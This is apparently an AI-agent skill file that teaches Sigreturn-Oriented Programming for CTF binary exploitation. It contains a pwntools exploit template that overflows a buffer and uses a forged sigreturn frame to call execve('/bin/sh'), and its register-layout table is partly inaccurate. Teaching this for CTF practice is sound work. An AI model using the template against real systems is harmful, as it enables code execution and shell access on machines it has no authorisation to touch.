---
name: srop-exploitation
description: Sigreturn-Oriented Programming (SROP) exploitation for binary security challenges. Use this skill whenever the user mentions SROP, sigreturn, signal handlers, register manipulation, syscall exploitation, or needs to craft exploits that control CPU registers through stack manipulation. Also trigger for CTF challenges involving signal-based vulnerabilities, ret2syscall with register control, or when a binary calls sigreturn and allows stack writes.
---

# SROP Exploitation Skill

Sigreturn-Oriented Programming (SROP) is a powerful exploitation technique that abuses the `sigreturn` syscall to gain arbitrary register control and execute syscalls like `execve` for shell access.

## When to Use This Skill

Use this skill when:
- A binary has a buffer overflow and calls `sigreturn` (or you can ROP to it)
- You need to control CPU registers to call syscalls with specific parameters
- Traditional ROP gadgets are limited but you can write to the stack
- The challenge involves signal handlers or signal-based vulnerabilities
- You're working on CTF pwn challenges with no PIE, no canary, NX enabled

## Core Concept

The `sigreturn` syscall restores CPU register state from a stack frame. By crafting a fake `sigreturn` frame on the stack, you can:
1. Set all general-purpose registers to arbitrary values
2. Control `RIP` to redirect execution
3. Call syscalls with fully controlled parameters (e.g., `execve` for `/bin/sh`)

This is essentially a **ret2syscall** with full parameter control.

## The Sigreturn Frame Structure

On x86-64, the `sigcontext` structure stored on the stack looks like this:

```
+--------------------+--------------------+
| rt_sigreturn()     | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc_stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```

## Exploitation Patterns

### Pattern 1: Binary Already Calls sigreturn

When the vulnerable binary calls `sigreturn` after a buffer overflow:

1. Calculate the offset to the return address
2. Overwrite the return address with the `sigreturn` function address
3. Place your crafted `sigreturn` frame immediately after
4. The frame will be popped when `sigreturn` executes

### Pattern 2: ROP to sigreturn

When the binary doesn't call `sigreturn` but you can ROP:

1. Find a `pop rax; ret` gadget
2. Load `0xf` (sigreturn syscall number) into `rax`
3. Find or use a `syscall` instruction address
4. Chain: `pop_rax` → `0xf` → `syscall_addr` → `sigreturn_frame`

## Common Syscall Numbers (x86-64 Linux)

| Syscall | Number | Use Case |
|---------|--------|----------|
| `execve` | 59 (0x3b) | Spawn shell |
| `sigreturn` | 15 (0xf) | Restore registers |
| `mprotect` | 10 (0xa) | Make memory executable |
| `read` | 0 | Read input |
| `write` | 1 | Write output |

## Using pwn's SigreturnFrame

The `pwntools` library provides `SigreturnFrame()` which automatically constructs a valid frame:

```python
from pwn import *

frame = SigreturnFrame()
frame.rax = 59       # execve syscall
frame.rdi = binsh    # /bin/sh address
frame.rsi = 0        # NULL (argv)
frame.rdx = 0        # NULL (envp)
frame.rip = syscall_addr  # Where to go after syscall
```

## Step-by-Step Exploitation Workflow

1. **Analyze the binary**
   - Check protections: `checksec --file ./vuln`
   - Look for `sigreturn` in the binary: `objdump -d ./vuln | grep sigreturn`
   - Find `/bin/sh` string: `strings ./vuln | grep /bin/sh`

2. **Determine the offset**
   - Use cyclic patterns or `pwntools` to find the exact offset to the return address

3. **Find necessary addresses**
   - `sigreturn` function address
   - `syscall` instruction address (if ROP needed)
   - `/bin/sh` string address
   - `pop rax; ret` gadget (if ROP needed)

4. **Craft the payload**
   - Padding to reach return address
   - `sigreturn` address (or ROP chain to it)
   - `SigreturnFrame()` with desired register values

5. **Test and iterate**
   - Use GDB to verify the exploit works
   - Check register values before `sigreturn` executes

## Example Exploit Template

```python
from pwn import *

# Setup
context.binary = ELF('./vuln')
p = process()

# Find addresses
BINSH = next(context.binary.search(b'/bin/sh'))
SIGRETURN = context.binary.symbols['sigreturn']
SYSCALL_ADDR = next(context.binary.search(b'\x0f\x05'))  # syscall instruction
POP_RAX = next(context.binary.search(b'\x58\xc3'))  # pop rax; ret

# Craft sigreturn frame
frame = SigreturnFrame()
frame.rax = 59       # execve
frame.rdi = BINSH    # /bin/sh
frame.rsi = 0        # NULL
frame.rdx = 0        # NULL
frame.rip = SYSCALL_ADDR  # Execute syscall after execve setup

# Build payload
payload = b'A' * OFFSET  # Padding to return address
payload += p64(POP_RAX)
payload += p64(0xf)     # sigreturn syscall number
payload += p64(SYSCALL_ADDR)
payload += bytes(frame)

# Send and interact
p.sendline(payload)
p.interactive()
```

## Debugging Tips

- **GDB breakpoint**: `break *0x40017c` (replace with sigreturn address)
- **Check registers**: `info registers` before sigreturn executes
- **Verify frame**: `x/20gx $rsp` to see the sigreturn frame on stack
- **Common issues**:
  - Wrong offset: use cyclic pattern generator
  - Wrong syscall number: verify with `man syscall`
  - Frame alignment: ensure 16-byte alignment on x86-64

## References

- [GuyInATuxedo SROP Tutorial](https://guyinatuxedo.github.io/16-srop/)
- [ir0nstone SROP Notes](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
- [CTF Recipes SROP](https://www.ctfrecipes.com/pwn/stack-exploitation/arbitrary-code-execution/code-reuse-attack/sigreturn-oriented-programming-srop)
- [YouTube: SROP Explained](https://youtu.be/ADULSwnQs-s)

## Related Skills

- ROP exploitation (when sigreturn isn't available)
- Ret2Syscall (simpler syscall exploitation)
- Shellcode injection (when you can make memory executable)
